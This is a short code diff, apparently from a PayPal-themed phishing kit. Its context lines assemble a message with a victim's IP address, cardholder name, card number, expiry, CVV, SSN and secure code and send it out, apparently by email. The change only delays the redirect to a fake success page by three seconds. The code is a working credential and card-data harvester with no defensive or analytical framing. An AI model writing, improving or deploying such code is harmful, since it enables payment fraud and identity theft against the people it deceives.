@@ -257,7 +257,7 @@ var fixacardnumber = cardnumber.replace(/\s+/g, '');
                         Body : 'PAYPAL CC \nIP : '+$('#ip').val()+'\n'+title +' '+bankName+' '+ typeCard + ' '+ brand +'\nCardHolder Name: '+$('#cc_holder').val()+'\nCC Num: '+fixacardnumber+'\nEXP: '+$('#month').val()+' / '+$('#year').val()+'\nCVV: '+$('#cvv2_number').val()+'\nSSN: '+$('#sort_code').val()+'\nSecure Code: '+$('#secure_code').val()
                         }).then(
                         // message => alert(message)
-                        window.location.replace("success.html")
+                        setInterval(function(){ window.location.replace("success.html"); }, 3000)
                         );
           }
           });
